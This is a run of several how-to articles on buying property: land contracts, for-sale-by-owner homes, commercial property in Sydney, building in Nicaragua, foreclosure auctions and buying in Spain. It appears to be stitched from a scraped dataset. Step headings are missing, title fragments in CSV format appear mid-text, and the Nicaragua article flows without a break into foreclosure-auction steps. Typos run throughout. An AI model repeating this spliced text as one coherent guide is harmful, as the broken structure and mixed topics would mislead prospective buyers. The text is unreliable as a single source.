, It is important to find a house that you like, because once you have entered into a land contract you will probably find it difficult to extricate yourself from the deal without losing your investment. The listing does not need to indicate that the owner wants to finance the deal privately. It might, however, help to negotiate with someone who has had difficulty selling the house, possibly targeting properties that have been on the market for a few months.There is no readily available resource for finding sellers interested in a land contract. Usually you will be responsible for convincing a buyer to accept the deal. However, your realtor will know some buyers and might have some insight as to which would be interested in a land contract.

, For a seller to take an interest in a land contract, you will need to offer good terms. Typically, houses sold via land contract sell for somewhat more than their normal rate. That means you will want to put in a higher offer than you otherwise would. You might want to offer the full listing price, possibly more, depending upon the local housing market., Many sellers would prefer to receive the large lump sum payment they would get from a bank financed sale. Others might see a land contract as risky. However, selling your house with land contract can be a substantial financial investment. Emphasize these facts to the seller and you will be more likely to secure a cooperating partner in your purchase. Also, provide the seller with some confidence of your own personal reliability so that he or she is willing to invest in you.Houses sold on land contract typically go for a higher price than they otherwise would. Selling a house through a land contract is a good way to get back the full value of a house.
The seller effectively becomes an interest-earning lender. Typically the rate of interest on a land contract is very high, as much as 11%.
Because the seller does not get all of their money at one time, they can also spread out the payment of the taxes due from the sale over a period of years.
The seller obtains a regular flow of cash, without the pain of renting. Typically they will not be required to maintain the home in the same way that they would for a renter, but get the benefit of a steady stream of income.

, This should include a minimum down payment, monthly payments, and interest rate. You will want to negotiate terms that you feel confident that you can pay, but also meet the seller’s demand to receive his or her money in a timely fashion. The flexibility in these deals is one of the principal advantages to buying with a land contract.


You should set up a contract that allows you to pay your debt ahead of schedule without any penalties. You should aim to spend as little time under contract as possible, because as long as you are under contract, there is the possibility that the deal with go awry and you will lose the house and your investment.Try to avoid including a balloon payment. A common feature of land contracts, they require you to close out the lending period, usually after a period of five to ten years, with a large lump sum payment of whatever is left on the loan. They ensure that the seller receives his or her payment in a timely fashion, ideally when the buyer will be in a better financial position to make such a large payment. Often you will need to take out a loan to cover a balloon payment. It is best to negotiate a deal that does not require a balloon payment as it can cost you your house if you are unable to meet the obligation. , Because land contracts can be risky ventures you should confirm that all components of the offer are satisfactory. You will need to consider not only special stipulations put into the deal, but also state laws. A legal expert can verify for you that there are no hidden pitfalls in the deal.


Check state laws to confirm procedures for missed payments. In some states a single missed payment will invalidate the deal, so that the seller will be able to keep the property and your payments, which become, in essence, rent payments. Other states give the buyer a right to the home if they were up-to-date with a majority of their payments and paid the total sum owed by a specified time.Ask the lawyer for a title opinion. This is a comprehensive survey of all liens and mortgages on a property, including unpaid taxes, construction fees, or debts to a homeowners association. If there is a lien or a mortgage on the house, your claim on it might be compromised even if you do make regular payments. , You should take a couple of days to review the contract, preferably with the help of a lawyer. Then sign the deal. If any of the details of it seem disadvantageous, try to renegotiate a better deal. Consider not just the financial stipulations of the contract, but also details about the care of the house.


In addition to basic stipulations, like payment time, grace period, payment amount, the contract should have stipulations pertaining to the maintenance of the property, including who will be responsible for property taxes and homeowners insurance. Similarly the contract should indicate who will fix property damage, though this is almost always the responsibility of the buyer., Although you are effectively a renter until you have completed your payments, land contracts typically make the buyer responsible for upkeep of property. That means that if there are any broken appliances, mold problems, termites, or foundation issues, you will be responsible for them. Home inspections are rarely commissioned for land contract and you typically will not have the bargaining power to demand that the owner fix any household issues that might exist before signing the contract. Therefore, you should budget for home improvements.In some cases, the contract might stipulate that the house be kept in a certain type of condition to preserve the owner’s investment in the house., If you continue to pay on time for a period – usually five or ten years – you will eventually get full, legal title to the house. Try to pay down the debt faster than the contract requires so that you can free yourself of the interest payments and come into full ownership of the home as soon as possible.

, There are multiple ways to find a FSBO home. Do your own research before you visit a real estate office. Here are some sources you can check out:Regional Multiple Listing Service (MLS) systems websites.
FSBO websites.
Classified ads in your local newspaper.
Online classified ads.
Drive around neighborhoods you are interested in.

, If you are a first time home buyer or uncertain about the process of buying a home, you may want to work with a buyer’s agent. A buyer’s agent can guide you through the process. A buyer’s agent works on your behalf to guide you through the closing process and does not represent the interests of the seller.The agent's fee will likely be an add-on to the agreed-upon price of the house or paid by the buyer since the purpose of most FSBO owners is to avoid real estate commissions.
The commission is typically 2.5-3% of the sale price.
Working with a buyer’s agent is not necessary. You can shop and make an offer on a home without one.
Your agent should be an Accredited Buyer Representative. Visit the National Association of Realtors' websiteor the National Association of Exclusive Buyer Agents' website.to find an accredited agent.
Speak to your agent before hiring them. It is important that you get along with them and develop a rapport as you search for homes.
Ask to for the contact information of your agent's three most recent clients. If they are satisfied and have good things to say, you probably found a good agent.It's a bad sign if the agent refuses to give you references.

, Call or email the owner to express your interest and set up a time to view the home. Ask the owner as many questions as you need to. Questions you should ask include:Why are you selling?
How long has the house been on the market?
Any issues with the neighborhood or your neighbors?
What is included in the sale? For example, ask about appliances (fridge, washer, dryer, microwave, etc.), decorations (drapes, rugs, etc.), and furniture.
Does the house have any problems?
Have there been any major renovations or repairs?
How old are the house, appliances, roof, heating and cooling system, plumbing systems, and electrical systems?
What do you enjoy about living in this home?
For rural homes, ask about how utilities (electricity, water, gas, etc.) are supplied, whether mineral rights are included, and if easements exist on the property.

, Investigate the surrounding area. Ask your agent or research school locations, nearby amenities like shopping or groceries, and transportation options. Ask about the homeowner's association and any associated fees or other restrictions. Research flood plain/flooding risk, crime statistics, and other risks associated with the area. Talk to the agent to get a sense of the demographics of the neighborhood and any developments occurring there (gentrification, transition from old to young homeowners or vice versa, etc.).

, C.L.U.E. stands for Comprehensive Loss Underwriting Exchange. This report will give you a 5 year history of all the insurance claims that have been filed for the home you are interested in. You must ask the seller for permission before you run the report. It will cost you $20 or less.The report will identify any problems that the house is likely to have and give you an idea of the insurance rates for the home.
Insurance companies typically use past claims to calculate insurance rates.
Only the owner if a property can access the CLUE report.Ask the seller to request a report. The seller can call 1-866-312-8076 or visit the LexisNexis website to make an online request., Ask your agent or the current homeowner for information regarding property taxes. There may be taxes assessed by the city, county, and/or local school districts. Ask for information regarding tax rates. What is the usual tax liability for the home? Does it stay consistent between years or vary unexpectedly? Try to get a sense of how much property tax you would pay in your first few years in the house.

, The homeowner may not tell you about all of the problems in their home, or they may not know some of the problems. A home inspector will thoroughly check the property and give you all the information you need to make a decision. The home inspector should check:Electrical wiring
Moisture levels
Carbon monoxide levels
Asbestos
Lead electromagnetic fields
Radon
Inspections usually do not happen until you make an offer, but you can always ask the seller to let you have one earlier in the process. Be present during the inspection so you can ask questions and see things firsthand.
Visit the American Society of Home Inspectors' website or call 1-800-743-2744 to find an accredited inspector.Before hiring an inspector, ask the how much it will cost and if you can be there. If the inspector does not want you to be at the inspection, choose a different inspector., The seller’s asking price should only be used as a starting point. Realtors usually help sellers set a price, but your seller is not working with a realtor. Find the property value of the neighboring homes to give you an idea of what the home is actually worth.Also check the recent sale prices of homes that are similar to the home you are interested in.
You can get appraisals from websites such as Zillow, Real Estate ABC, and Electronic Appraiser. The Electronic Appraiser website offers the most accurate report and costs $29.95., Base your offer price on the asking price, the market value of the home, the value of the neighboring homes, and the current housing market. If the housing market is strong in your area, you may need to make an offer that is above the asking price. If the market is not strong, you may be able to offer below or right at the asking price.For example, if the asking price is $200,000, and the estimated home value was $170,000, you may start with an offer of $153,000 (90% of the market value). This offer would be acceptable in a market that is not very strong.
If the market was strong, you may start with the appraised value of the home: $170,000.
If you bid too low, the seller may immediately reject your offer. Work with your attorney to set your offer.
You should also determine your own maximum offer price, which will be based on how much you can afford and how much you are willing to pay for the home.
Knowing a maximum offer price will allow you to guide negotiations lower than your limit or know when to move on and drop negotiations.

, A sales contract and closing process are complicated. A real estate attorney can help you navigate this process and ensure that you have a way out of your contract if there problems with the home inspection or with the seller.Your attorney can also help you negotiate who will pay the title transfer fee and taxes.
Bring your real estate attorney in early on.
Choose a local attorney that is familiar with the neighborhood that you are buying in.An attorney usually charges a flat fee or requires you to pay by the hour. If you are paying by the hour, show up as prepared as you can to reduce the amount of time you are paying for.

, Paying the seller for an option to buy the house takes the house off the market, provides more time before closing, and gives you options for disposal (sale or moving in). The option price should be covered in the final sales price if closed or recovered if conditions of the option are not met by seller. However, understand that the option price may be lost if the home isn't purchased.

, The offer will include contingencies designed to protect you from unforeseen flaws with the home. The contingencies often allow you to inspect the home further and/or proceed through the closing process and get out of your offer if certain issues arise. For example, contingencies might be the house being appraised at the agreed-upon sale price or higher, your ability to find acceptable (in your opinion) financing, the title passing free and clear, the amount of the deposit, and/or return of any deposits if sale doesn't close.

, Contact the seller or work through your agent to submit your offer. Be sure to submit it complete with your requested contingencies and specific offer price. You may wish to have your attorney review the offer one more time before you send it.

, The seller may not accept and then counter your offer. The seller may hope that you split the difference or the counteroffer may be firm and non-negotiable. The seller may also outright reject your offer.If the seller is hoping for a split, find an amount that is in between the counter offer and your original offer. For example, if you offered $153,000 and the seller countered with $193,000, you may offer $173,000.
If the seller counteroffers and says they are not willing to negotiate any further, you can either accept the offer or tell the seller to let you know if they have a change of heart.
If you can afford to wait, the seller may change their mind and be willing to negotiate.

, There may be additional contingencies applied to the offer as the closing process moves forward. Contingencies might include the seller providing financing (which would be beneficial to older people without a home mortgage with a lower rate of interest for buyer), a second mortgage by seller to reduce the buyer's out-of-pocket cash, a delayed move, or the completed sale of buyer's existing home, among other possibilities.

, Get a confirmation from the buyer on your offer price and contingencies as specific in your offer. Have them sign the offer and finalize the sale price so that you can begin the closing process. After this agreement, the buyer and seller enter into an escrow period, typically ranging from 2 weeks to a month, during which time conditions of the offer are being met.

, Your lender will choose an appraiser to see if the house is actually worth what you offered to pay. If the appraisal is lower than your offer, the seller will need to lower the price.


Be sure to request an appraiser that is familiar with the neighborhood that your home is in.
If you have to find an appraiser, visit the American Society of Appraisers' websiteor the Appraisal Institute website to find an accredited appraiser in your area. Ask how much they will charge.
If you do not agree with the first appraisal, you can request a second appraisal.
A contingency on the offer should be the house being appraised at or above offer price.

, If you were not able to have a home inspection earlier, you can have one now. Again, find an accredited home inspector. If there are any problems with the home, you can ask the seller to fix them or you can withdraw your offer. There should be contingency in your offer for disclosed and undisclosed problems, who pays for repairs, any limits, and other rules regarding the inspection results.If your offer was low, the seller is less likely to pay for the repairs. If you made a higher offer, the seller may pay for the repairs.
Your lender may also request that repairs be made before escrow closes.

, Sit with your attorney and go over the sales contract again. You should also do a final inspection at this time. You want to make sure that any negotiated repairs have been made and that the house has not been damaged during escrow.


If the seller is leaving some appliances, make sure that they are there.
Do not sign any papers until you are comfortable with the terms of the contract, and you have a clear understanding of everything.

, Go through your agreed-upon offer to see that your negotiated contingency conditions have been met. Address any unresolved contingency issues. Have your attorney help you through this examination.

, A title company will do a title search and will assist with the closing process. Ask your attorney for recommendations. You can also find a title company by contacting the American Land Title Association. Your attorney and title company will work together., Once all of your forms are filled out and both you and the seller are happy, it is time to sign the papers and get your keys. You may or may not meet with the seller on closing day.If you are working with a buyer's agent, you will sign at their office.
If you are handling this on your own, you will sign at the escrow office or title insurance company.

",How to Buy a Commercial Property in Sydney,"


If you currently lease a property where you conduct business, buying a commercial property could enhance your company's assets and minimize costs, as you won't be paying rent anymore. In addition, if you plan to use the property for your own business operations, you'll know exactly what requirements the property must meet.
Leasing a commercial property in Sydney to other companies can be an effective investment. Types of commercial property include those that are zoned and equipped for office, retail, or warehouse use.;
,


Consult with your accountant, financial adviser, and lawyer, as well as a dependable commercial realtor while analyzing the costs and benefits.
Make sure your commercial realtor is a member of the Real Estate Institute of Australia (REIA) or the Real Estate Institute of New South Wales (REINSW). These organizations promote an ethical code of conduct for their members, and can provide reliable information about the commercial real estate market in Sydney.
Take into account that buying a commercial property can result in loss of liquidity for your company, and that returns may not be as high as projected due to devaluation or defaulting tenants.
Assess how the costs of renovations, maintenance, and property management will impact your company's revenue.
Estimate the projected revenue in terms of asset building and/or rental income, as well as the deductible you gain on your taxes due to devaluation of the property.

, Keep the purpose of your purchase in mind during your inspections and make a checklist of requirements that the property needs to meet in order to be an option for purchase.

, Research whether it's zoned for commercial use and what, if any, development plans exist for the surrounding area that may impact the value of the property.

Decide what lifestyle you want in your Nicaraguan home.,
Recognize the state of Nicaragua's home-building industry.,
Develop a budget, but be careful not to make it too low.,
Hire a contractor.",How to Build a House in Nicaragua," Read how to Buy Property in Nicaragua for details.;
,, Many people go to Nicaragua to live a completely different lifestyle (no electricity, no phone, etc.). Some people may pressure you to adopt this type of living, but it's your decision. It will be your home. You need to be comfortable in it. Let the people facilitating your move know what your requirements are. If they can't provide them, find someone who can.

, The industry is maturing. The number of home-builders is rising, as is the reliability of the contractors. However, the home-building process is not as fast and smooth in Nicaragua as it is in certain other countries. You may need to lower your expectations to some extent. Just know that building standards are gradually improving.


Currently Nicaragua is using many building standards, none of which would be acceptable in more industrialized countries. Your goal should be to build a home which meets current standards in higher-end Costa Rican homes. Currently there are many differences between Costa Rican homes and Nicaraguan homes, involving design, materials and construction techniques. You want to find a contractor willing to meet the higher standards.

, Essentially there is no limit to how cheaply you can build a home in Nicaragua. This is because there is little enforcement of building regulations. A home can be built with no supports, too small a foundation, no hot water, no electrical grounding. It can be built on unstable soil or in a flood plain. This means you should not focus on building as cheaply as possible. Instead, make your home a good investment. Spending an extra $20,000 can add twice that much value to your home.


Labor in Nicaragua is some of the cheapest in the world. This creates an opportunity to build a home you might not be able to afford somewhere else. You might be able to include amazing arched ceilings, arched entry ways, and arched windows, decorative concrete, stamped concrete, stained concrete and rounded corners. The possibilities are limited only by your imagination, so take advantage of a great opportunity.

, There are three categories of contractors in Nicaragua.


Local companies and builders. While this option can be attractive, keep in mind that construction practices would not meet most western builders' standards.
A combination of “Construction Management” and construction companies that offer this service because their clients have requested it. This group of contractors can pretty well guarantee that your project will be completed to a high Nicaraguan standard. These companies will offer homes that rise to a so-called Western standard but one that will not meet U.S. or Canadian levels. You will need a bullet-proof contract that covers building permits, hook-ups and construction. You (and your lawyer) will need to be paying very close attention to the project.
The best option is to hire a truly professional construction company. Some of the best will have subsidiaries in the United States or Canada that can offer a contract that is legally binding in your home country, receive payments and provide contacts, all in the comfort of your home country. These companies hire builders with experience in the U.S. or other industrialized countries. They may also have experience working in hostile areas with varying degrees of difficulty. These companies can build multi-level pools, multi-story structures, decorative concrete finishes, off-grid power sources (see below), etc. These companies will also benefit from extensive local government contacts. They will do the work themselves, rather than subcontracting it to others. They can build durable and attractive homes featuring finishes and other specialties not well known in Nicaragua. Such companies train their employees when necessary and maintain a close eye on their progress.

Do a quick online search for these specialists and discuss your options with them. They will guide you through the different types of paperwork you will need as well as what to expect during the process. In addition, they can help you complete a lot of the tasks leading up to the auction itself., In general, there are two types of foreclosure auctions, which include public and private auctions. In addition, both public and private auctions can take place live or online. For example, in Miami-Dade County, Florida, public foreclosure auctions take place online.You can often find auctions by looking in your local newspaper, online real estate listings, or by using your specialized agent.


Public foreclosures usually occur soon after ownership of the property transfers to the lender. In contrast, private auctions usually take place after a failed public auction and after the lender has already been listed by real estate agencies.Live auctions are conducted in-person and in a location open to the public. In contrast, online auctions are conducted over the internet using various reputable websites., Find local auctions in the area where you are looking at purchasing and go to a couple. When you go them, observe the buyers, the auctioneers, and the process.


Buyers may try to intimidate others in order to scare them out of a bidding war. Other times, buyers may be as discreet as possible in order to stay under the radar. Going to a few auctions and observing will give you ideas about how to handle these tactics.
The auctioneers are there to sell the property for the highest price possible. See how different auctioneers conduct their business and look for an auction that is as relaxed as possible.
When you go to auctions as an observer, ask questions before and after the auction itself. Try to get an idea of how much money you need to bring, the types of payments they accept, how the bidding process works, and what is expected of you after the bidding is over., Once you find an auction you feel comfortable with, keep an eye on properties going through that auction house or public process. While looking for attractive properties, you need to know what to look for. Most properties sold at auction are sold ""as-is"", which means you will take possession of the property with no guarantee of its condition.Because properties are sold as-is, you should look for properties that look to be in good condition. Do not focus your attention on homes that have visible exterior damage or title concerns.

, Lenders usually do not have a right of possession until the auction is complete. Therefore, you will likely not get a chance to tour the property to search for shortcomings. In order to inspect the property, drive by and take pictures of the exterior. If you have permission, you may be able to walk around the home and look around. Gather as much information about the home and the neighborhood as you can. You can also try to talk with neighbors about the area as well.


Never try to enter the home or the property without permission. Doing so may amount to trespassing and may lead to criminal or civil penalties., A title search involves looking through public records in order to understand the history of a particular parcel. When you conduct a title search, you will be able to learn who owns the property, what tax liabilities you may be responsible for, and if any other creditors have claims on the property. If a creditor has a claim on the property, it may affect the type of title you would get if you purchased the property at auction.


If you purchase a property subject to a lien, you may have to pay off the creditor in order to get rid of the lien. This is an extra cost you may not want to be responsible for.
To conduct a title search, go to the county recorder's office where the property is located and ask to examine property records. You can usually do this in-person and for free. However, it may cost you to make copies of the documents you find.

, To get an idea of what a home is worth, look at other home values in the area. Try to find homes that have a comparable size and location.When you find comparable homes, look into their values. Ask neighbors or use your specialized agent for this process.


Doing this will help you determine how much you should be willing to bid at auction. You do not want to end up paying more than the property is worth.

, Once you think you know how much the property is worth, you will need to get the funding necessary to complete a purchase. Most auctions require you to pay the full purchase price immediately after the auction or soon after. Therefore, you will need to get enough funding to be able to cover the full purchase price before you go to the auction.If you do not have that amount of cash on hand, you may have to get various loans in order to cover the costs. Talk with your local bank to determine what funding sources are available to you.
Some auctions will allow you to finance your purchase.If your auction allows this, take the time to get pre-approved for a mortgage. When you go to the bank to get pre-approved, you will provide them with financial information. The bank will then make a determination about how much loan they would be willing to offer you for the purchase of a home. If you are pre-approved, you will show the auction that you are a serious buyer and that you have the funds available to purchase., A few days before the auction, you need to talk to the individuals holding the auction to confirm the auction's status. Make sure you know when the auction is and where it will be held. Auctions can, and often are, cancelled or postponed for various reasons.


Borrowers usually have a right of redemption, which allows them a period of time to pay off the debt and keep their home. If this happens, the property you are interested in may be taken off the auction block. This is one of the many reasons to check in with the auction before you go., Auctions don't last long. If you arrive even 10 minutes late you could miss your property. Make sure you arrive before the auction starts so you have time to register and get yourself in order., Most foreclosure auctions accept cash, money orders, or certified checks. In most states, you will be required to put down an advanced deposit before you will be allowed to participate in the auction itself. Usually, the amount you are required to put down will be 5-10% of the expected final bid on the property you are interested in.For example, if the property you are looking at is expected to sell for $300,000, you may be required to bring an advanced deposit of $30,000 just to participate.

, Once the auction starts, you will bid on the property you are interested in. In most cases, you will have a numbered paddle or you will simply raise your hand to bid. Make sure you listen closely to the auctioneer so you understand where the price is at.


Always have a maximum price for your properties. If the bidding goes above your price, stop bidding and wait for another property to come along. While you may have loved the home, you do not want to pay more than it is worth.

, When the bidding ends, the auctioneer will indicate who has won the bidding. If you have won, you will have to speak with an auction administrator as soon as the auction is over. They will tell you how to make your final payment and how to take possession of the property.


Do not leave the auction without getting these details. If you do, you may lose the property and forfeit your advanced deposit.

, As soon as the auction ends, you will begin the process of transferring ownership of the property to you. In most states, you will be required to fill out a certificate of sale or an execution of sale receipt. You may also be required to submit a deed of sale and Internal Revenue Service (IRS) Form 8300.The deed of sale is the transfer document that evidences the fact that you are getting the property from the lender. This document must be recorded with the county recorder's office.IRS Form 8300 is form required to report cash payments over $10,000. It will ask for your personal information as well as the lender's information. You will then describe the method of payment, how much was transferred, and what it was transferred for (i.e., to purchase real property). The lender will usually be the one to fill this out on your behalf., Most of the properties you will bid on at foreclosure auctions will be transferred using quitclaim or special warranty deeds. This means you will not be promised that the property is in a certain condition, or even that the lender has an unencumbered interest in the property. In most cases, you will receive whatever ownership interest the lender has in the property (and sometimes the lender will not even know the extent of their ownership interest). For these reasons, it is important to purchase title insurance before you take possession of the property.


Title insurance will protect you against any undiscovered liens and other title defects you would otherwise be responsible for.Talk to your real estate agent about quality insurance products. If you do not have a real estate agent, look online for a reputable insurance company that sells title insurance.

, At public auctions, the sales made will have to be ratified by the court. This ensures that the borrower was indeed late on payments and that the lender had the right to sell the home. This will usually happen relatively quickly after the auction, maybe even within a few days.


Once the sale has been ratified, you will be required to move quickly in order to finalize the deal.

, If you are going to take out a mortgage to finance the home, it is time to finalize the mortgage and get your check. This needs to be done soon after you bid on the home. The auction and the lender will require payment quickly.


To finalize your loan, go to the bank that pre-approved you and get the paperwork started.

, Once you receive a cashier's check from the bank that covers the purchase price of the home, you will need to deliver it to the appropriate party. This will usually need to be done in a matter of days. If you fail to deliver payment on time, you may forfeit your right to purchase the property as well as any money you have already put down.

, Once you pay for the home, you will be given your deed as well as possession of the home. However, even once you get possession of the home, you may still have to work to eject the family currently living there.


If you need to bring an eviction action, talk to your local sheriff's office for instructions."

Generally, this means you will be best off buying in vacation hot spots like the coasts and islands, or in big cities like Barcelona, Valencia, and Madrid. Although country homes have been rising in value of late, investing in the countryside can prove difficult because it can be hard to find people to manage your property.
Vacation home – You will want a home that is easy to lock and leave. You don’t want to spend all year dealing with a home that you spend only a few weeks at. Apartments and villas in developments are generally the best option for this, as the grounds will be cared for and the presence of neighbors will help to keep your property safe. Buying in popular tourist areas will also make your property easier to rent if you want to earn income when you are not using it.
Permanent home – You will want to look for a home and region that fits your budget and offers the quality of life you desire in terms of local infrastructure, facilities, and accessibility. So while you may long for a country home, it may not be reasonable if you also want to be near stores and other expats. You will also need to consider the local schools if you have children, and access (TGV and airports) if you wish to travel or entertain guests.;
, Alongside price of the property, fees and taxes, there are annual taxes you will have to pay whether you move to Spain, rent your property, or use it as a vacation home.


IBI (Impuesto Sobre Bienes Inmuebles) is a property ownership tax set locally that ranges from 0.4% to 1.1% of the valor catastral – the administrative value of the property, often lower than the market value. Owners might pay as little as 100 euros per year for a small country property, but a luxury home in an expensive development on the waterfront in Marbella might cost as much as 3,000 euros per year.Wealth Tax – Over a certain amount, the net worldwide assets of residents and the Spanish assets of non-residents are taxed. There is a 700,000 euro deduction per person (500,000 in Catalonia) and a 300,000 euro deduction for the property of residents. Tax is then calculated on assets above and beyond these deductions, with the rate ranging from .2% to 2.5%. For the rate table, see here.
Personal Income Tax – Non-residents pay this tax based on the property they own in Spain. Those who don’t rent out their property and have no other Spanish income pay 25% of 2% of the valor catastral of the property. A property worth 500,000 euros, for instance, would pay 25% of 10,000 euros, or 2,500 euros. Non-residents who rent out their property must pay taxes on the income generated, generally 25% of the gross income earned in Spain., If you are a national from another EEC (European Economic Community) country, then you already have the right to move to and work in Spain. However, you will need to acquire a residency card if you are retiring to Spain, moving to Spain and not working, or are a non-EU dependant of an EU national.If you are from outside the EU, you will need to apply for a residence visa in order to immigrate to Spain, and a work permit if you want to work there. The most common types of visa are:Resident Visa to Retire in Spain – This visa allows you to live in Spain without working. You will need a valid current passport, proof of adequate financial resources to live in Spain without working, a medical certificate from your doctor verifying that you do not suffer from contagious diseases, drug addiction, or mental illness, and a fee of $38 to $160, depending on your nationality.Resident Visa to Work in Spain – To get a working visa, you will first need to be hired by a Spanish company. They will contact the Spanish Immigration Office to request a letter approving your work permit and residency visa. When applying for your visa, you will need this letter, a valid passport, a Police Records Certificate from the country you currently live in, a medical certificate, and a fee of $38 to $190, depending on your nationality.Residence Visa for Investors or Self-Employed – You can acquire this visa if your source of income will not involve being hired in Spain. In addition to the application forms, you will need a valid passport, a Police Records Certificate, a Medical Certificate, evidence of proper degree or academic title if necessary for your work, evidence that you are financially sound, and a work or investment project document showing the type of business you will conduct, projected gains, and positions to be created (if applicable), as well as a list of the authorizations and permits required to conduct your business., Buying a home in Spain is a major, and life-changing, experience. Think carefully before making any decision and ensure that your family is behind you.


Once you know which area and property you’re interested in buying, be certain you have enough funds for the purchase. Don’t forget to consider such aspects as the cost of moving your possessions to Spain.
Don’t be rushed into making a decision, and don’t let yourself be pressured. Certainly don’t sign anything until you’re ready.
Pensioners should make certain that they can have their pensions paid into a Spanish bank. It’s most important that your have health insurance in place and that you make a will. Resident non-citizens may also purchase Spanish health insurance (cost depends on income) by visiting a social security office in Spain.
Sometimes circumstances change, and you might find you want to return to your home country. Before committing yourself to purchasing a home in Spain, make sure you have sufficient funds to make the move back home.

, The region that is right for you is a subjective decision. You may be looking for the sun, sand, and expat community of the southeast coast, or prefer a quiet rural area. Be sure to research the regions carefully, and then visit the areas you think sound promising before you start searching for property in earnest.

, The regions of Catalona, Valencia, and Murcia contain a long stretch of coast that has been called Spain’s California because of its mild climate and beautiful beaches.


Catalonia – Prices Medium to High – This region includes Barcelona and the Costa Brava – the coast north of the city where the Pyrenees run down to the sea – and the Costa Dorada, the flatter coast south of Barcelona. The area is well-developed and efficiently run, with beautiful beaches and an attractive countryside of farms, orchards, and vineyards. The winters are mild.Valencia – Prices Low (south coast) to Hight (north coast) – The Mediterranean coast south of Catalonia features a mild year-round climate, beautiful beaches, and a large expat community, particularly along the Costa Blanca, which runs from Denia to Pilar de la Horadada, south of Alicante. Its popularity with expats from across Northern Europe makes the Costa Blanca a cosmopolitan and varied place to live. However it also means higher taxes on new properties.Murcia – Prices Low – This area includes the Costa Calida, which lies south of the Costa Blanca. The climate is very dry, and the region is not highly developed. However, both the cost of purchasing property and the cost of living are very low, making this an attractive retirement location., Andalusia is extremely varied, with three stretches of coast that each have markedly different characters, and a variety of famous cities such as Seville, Cadiz, and Granada.


Andalusia – Prices Medium to High – Andalusia is home to the Costa de la Luz, Costa de Almeria, and the Costa del Sol. This last stretch of coast is hugely popular among British expats due to its warm climate. The Costa de la Luz is both cooler and much less developed., The pricey Balearics off the coast of Spain and the more low-key Canaries off of Morocco's southern coast are perhaps more different than they are alike, though these island destinations share the distinction of being popular vacation and retirement destinations for Spaniards and foreigners alike.


Balearics – Price High – Though expensive, these islands feature temperate, but seasonal weather, beautiful scenery, and high-quality housing stock. The largest, Mallorca, features great marinas, an opera house, and an international crowd. Menorca has a drier climate, with a cooling breeze that takes the edge off the baking heat of the summer. Ibiza has a reputation as a party destination for tourists, which means it is a good place to buy a property to rent out. Formentera is the smallest island with a mixture of attractive new developments and mellow old farmhouses.
Canaries – Price Medium – Though a bit isolated and far distant from the rest of Spain, the Canary islands have the warmest summer climate in Spain, a varied topography including mountains and sandy beaches, a large international community, and lower taxes when purchasing property., The northern interior of Spain tends to be hotter and drier, while the northwest coast is cooler and wilder. As a result, both offer good value, particularly Galicia.


Galicia – Price Low – Though the weather is cooler and the winters less mild than the more famous southeast, the northwest Atlantic coast has grown more popular recently due to lower costs, fewer expats, and a more rural feel., Homes in Barcelona retained their value better than the coasts in the recent downturn, while the property markets in Madrid and Valencia have recently begun to recover, making them good sites for investment.A variety of other cities like Segovia, Granada, Cordoba, Ovieda, Sevilla, and Vigo offer beautiful architecture and a high quality of life.Four cities, however, stand out as popular places to buy:


Barcelona – Price High – The Telegraph recently listed Barcelona as one of the top 20 places in the world to invest in propertyThe second largest city in Spain and its cultural capital, it boasts a beautiful old town, a mild Mediterranean climate, and access to nearby beaches.Madrid – Price High – The capital of Spain and the third largest city in Europe, Madrid is rich with history and things to do, though it does get rather hot during the summer.
Valencia – Price Medium – Known as the “California of Europe,” Valencia has mild temperatures, great cuisine, a rich history and beautiful architecture. It also offers easy access to beautiful beaches.Malaga – Price Low – At the heart of the Costa del Sol, Malaga offers a charming old town center, low prices,and has recently been rated the best Spanish city to live in., The best way to narrow down where you might want to live is by researching various areas exhaustively. Use the internet, magazines and books related to purchasing homes in Spain.Be sure to research:


The property market in the area. If you are buying as an investment, you will want to avoid areas with declining values.
The nature of daily life in the area.
The downsides and risks in that area. Is it isolated? Are taxes relatively high compared to other areas? Is it developed enough for your tastes?
Lawyers and agents who you might work with during your purchase.

, The ideal way to do this is to rent for a few months in the area you are considering. If that is not possible, even a week dedicated to exploring the region and talking to ex-pats about their experience can be hugely helpful. Be sure to treat this as a fact-finding mission, not a vacation. Your goal is to get a feel for daily life and to meet the people who you will work with in buying property., Get your finances in order and investigate a mortgage. You will need to do this in advance so that you can move quickly when you find the property you want. There are three options: remortgaging your current home (i.e. taking a home equity loan), borrowing from a bank in your current country, or arranging a mortgage on your Spanish property through a Spanish lender. Bear in mind that an overseas mortgage may incur higher set-up costs (sometimes 3 to 4 per cent of the amount borrowed) and that Spanish lenders will not be interested in doing business if existing loans exceed 35 per cent of the borrower’s income, as is the case in much of Western Europe.


Remortgaging – This is typically the cheapest and easiest solution. Releasing equity in your current home means that the second home can be purchased for cash, without the need for another mortgage. However, this is only feasible for those who own their first home outright. Also, you may lose your home if you cannot make your payments.Loan in your country – Most banks that lend for purchasing in Spain will have offices there, meaning you are technically borrowing in Spain. However, it can be easier to work with a local bank. You will also need to consider the type of currency you take the loan in. If you will be living off of income in your home country, then it is a good idea to take the loan in that currency to avoid exchange-rate fluctuations that might increase your repayments. If you will be generating income in Spain – buy renting your property, for instance – then consider taking out the loan in euros.Loan in Spain – Taking out a mortgage in Spain can simplify repayments, save you on the bank commissions charge for international transactions, and allow you to take advantage of low interest rates.However, a Spanish mortgage will increase initial costs, since the stamp tax you pay upon purchasing a new home will be based not on the loan amount, but on the value of the mortgage including interests and costs. This will increase the stamp tax from .5% to 1% to somewhere between 1.5% and 2%., When evaluating properties, you should budget 15% on top of the agreed purchase price to cover the various fees and taxes that must be paid.Legal fees – Many lawyers charge 1% of purchase price or more. It is generally more cost-effective to hire a lawyer by the hour. A typical transaction should cost 1,000 to 2,500 euros.IVA (Spain’s equivalent of VAT) – This tax is 10% for residential properties that have never before been occupied, plus 1% stamp duty. The stamp duty is 1.5% in Valencia and 2% in Murcia.In the Canaries, the IVA is 4.5%ITP (Impuesto sovre Transmisiones Patrimoniales) – This transfer tax is due on re-sale property. It is generally 7%, but may be as high as 10%, depending on the region where you are buying and the price. For the ITP for various regions, see here.
Notary and property registration fees – These range from .5% to 1%.Land registry costs - The cost to register is usually around 1%.

, There are a variety of different types of home available in Spain, from small apartments to large villas. What you are looking for will depend on your budget and how you intend to use the property.Villa (vivienda unifamiliar) – These are relatively large detached properties with a home and grounds. They are great permanent homes, but function less well as vacation homes, since the grounds entail a good deal of maintenance year-round and their value results in higher taxes.
Apartment (apartamento) – Apartments are the most widely available type of property in Spain. They are ideal vacation properties, as they are easier and cheaper to manage. It is also easier to find apartments close to town centers.
